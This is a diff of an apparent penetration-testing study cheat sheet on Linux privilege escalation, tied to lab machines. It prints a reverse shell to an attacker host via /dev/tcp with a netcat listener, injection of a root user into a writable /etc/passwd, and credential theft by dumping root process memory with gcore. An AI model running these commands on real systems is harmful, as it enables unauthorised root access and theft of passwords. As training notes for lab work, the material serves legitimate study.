@@ -457,13 +457,17 @@ echo "bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1" >> /path/to/script.sh
 nc -lnvp <PORT>   # wait up to one cron interval (~60 sec)
 ```
 
-**/etc/passwd world-writable:**
+**/etc/passwd writable (world-write OR owned by your user):**
 ```bash
-ls -lah /etc/passwd                                             # confirm -rw-rw-rw-
-openssl passwd w00t                                             # generate hash
-echo 'root2:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd   # inject UID 0 user
-su root2                                                        # switch: password is w00t
+ls -lah /etc/passwd          # check owner AND permissions — if YOU own it, rw- for owner is enough
+# On Kali: generate hash
+openssl passwd -1 -salt xyz hacked
+# On target: append UID-0 entry — SINGLE QUOTES protect $ signs
+echo 'hacked:$1$xyz$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
+su hacked                    # password: hacked → root shell
 ```
+> ⚠️ World-writable (`-rw-rw-rw-`) is the obvious case. Owner-writable is subtler — check `ls -la /etc/passwd` and compare the **owner name** to your current user, not just the permission bits. Snookums (PG): `michael` owned /etc/passwd because the web app ran as michael.
+> ⚠️ Use **single quotes** in the `echo` command — double quotes will interpret `$1`, `$xyz` etc. as shell variables and corrupt the hash.
 
 #### Step 3c: SUID + Capabilities (Module 18.4.1)
 
@@ -494,6 +498,15 @@ sudo find / -exec /bin/sh \; -quit
 
 # If GTFOBins technique fails with Permission denied: check AppArmor
 cat /var/log/syslog | grep apparmor   # apparmor="DENIED" = blocked, try next binary
+
+# (ALL) ALL → instant root
+sudo su   # or sudo -i / sudo /bin/bash
+
+# gcore NOPASSWD → root process memory dump (PG: Pelican)
+ps aux | grep root   # find a root process holding credentials (look for password-store, keepass, etc.)
+sudo gcore <PID>     # dump its memory to core.<PID>
+strings core.<PID> | grep -A 1 "Password:"   # extract plaintext creds
+su root              # use extracted password
 ```
 
 #### Step 4: Kernel / SUID Binary CVEs (Module 18.4.3)
